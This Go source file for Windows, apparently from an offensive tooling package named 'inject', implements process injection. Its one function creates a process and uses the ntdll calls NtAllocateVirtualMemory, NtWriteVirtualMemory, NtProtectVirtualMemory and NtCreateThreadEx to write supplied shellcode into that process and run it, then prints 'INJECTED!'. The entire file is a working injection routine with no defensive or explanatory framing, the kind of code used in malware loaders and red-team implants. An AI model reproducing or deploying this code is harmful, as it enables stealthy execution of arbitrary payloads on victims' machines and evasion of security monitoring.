// +build windows

package inject

import (
	"fmt"
	"log"
	"unsafe"

	"golang.org/x/sys/windows"
)

func NtCreateRemoteThread(shellcode []byte) {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	ntAllocateVirtualMemory := ntdll.NewProc("NtAllocateVirtualMemory")
	ntProtectVirtualMemory := ntdll.NewProc("NtProtectVirtualMemory")
	ntWriteVirtualMemory := ntdll.NewProc("NtWriteVirtualMemory")
	ntCreateThreadEx := ntdll.NewProc("NtCreateThreadEx")
	closeHandle := kernel32.NewProc("CloseHandle")

	pi := CreateProcess()
	oldProtect := windows.PAGE_READWRITE
	var lpBaseAddress uintptr
	size := len(shellcode)

	_, _, errNtAllocateVirtualMemory := ntAllocateVirtualMemory.Call(uintptr(pi.Process), uintptr(unsafe.Pointer(&lpBaseAddress)), 0, uintptr(unsafe.Pointer(&size)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if errNtAllocateVirtualMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling NtAllocateVirtualMemory:\r\n%s", errNtAllocateVirtualMemory.Error()))
	}

	_, _, errNtWriteVirtualMemory := ntWriteVirtualMemory.Call(uintptr(pi.Process), lpBaseAddress, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(size), 0)
	if errNtWriteVirtualMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling NtWriteVirtualMemory:\r\n%s", errNtWriteVirtualMemory.Error()))
	}

	_, _, errNtProtectVirtualMemory := ntProtectVirtualMemory.Call(uintptr(pi.Process), uintptr(unsafe.Pointer(&lpBaseAddress)), uintptr(unsafe.Pointer(&size)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errNtProtectVirtualMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling NtProtectVirtualMemory:\r\n%s", errNtProtectVirtualMemory.Error()))
	}

	_, _, errNtCreateThreadEx := ntCreateThreadEx.Call(uintptr(unsafe.Pointer(&pi.Thread)), windows.GENERIC_EXECUTE, 0, uintptr(pi.Process), lpBaseAddress, lpBaseAddress, 0, 0, 0, 0, 0)
	if errNtCreateThreadEx.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling NtCreateThreadEx:\r\n%s", errNtCreateThreadEx.Error()))
	}

	_, _, errCloseHandle := closeHandle.Call(uintptr(pi.Process))
	if errCloseHandle.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling CloseHandle:\r\n%s", errCloseHandle.Error()))
	}

	fmt.Println("INJECTED!")
}
